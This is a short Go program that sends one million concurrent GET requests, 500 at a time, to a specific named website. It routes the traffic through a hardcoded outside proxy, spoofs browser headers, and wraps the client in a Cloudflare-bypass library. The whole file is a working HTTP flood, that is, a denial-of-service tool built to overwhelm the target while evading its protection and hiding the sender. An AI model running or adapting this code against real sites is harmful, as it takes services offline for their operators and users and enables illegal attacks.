package main

import (
	"fmt"
	// "io/ioutil"
	"net/http"
	"sync"
	"os"
	"github.com/DaRealFreak/cloudflare-bp-go"
)

func main() {
	url := "https://lay.rip/abstract"
	os.Setenv("HTTP_PROXY", "http://65.109.121.46:51080")
	os.Setenv("HTTPS_PROXY", "http://65.109.121.46:51080")
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 500)
	for i := 0; i < 1000000; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			semaphore <- struct{}{}

			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				fmt.Println(err)
				<-semaphore
				return
			}

			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Referer", url)
			req.Header.Set("Accept-Language", "en-US")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
			req.Header.Set("Cache-Control", "max-age=0")
			req.Header.Set("DNT", "1")
			req.Header.Set("Connection", "keep-alive")



			client := &http.Client{}
			client.Transport = &http.Transport{Proxy: http.ProxyFromEnvironment} // use proxy
			client.Transport = cloudflarebp.AddCloudFlareByPass(client.Transport)
			resp, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				<-semaphore
				return
			}
			defer resp.Body.Close()
			
			//body, err := ioutil.ReadAll(resp.Body)
			//if err != nil {
			//	fmt.Println(err)
			//	<-semaphore
			//	return
			//}

			// fmt.Println(string(body))
			fmt.Println("Status code:", resp.StatusCode)
			<-semaphore
		}()
	}

	wg.Wait()
}
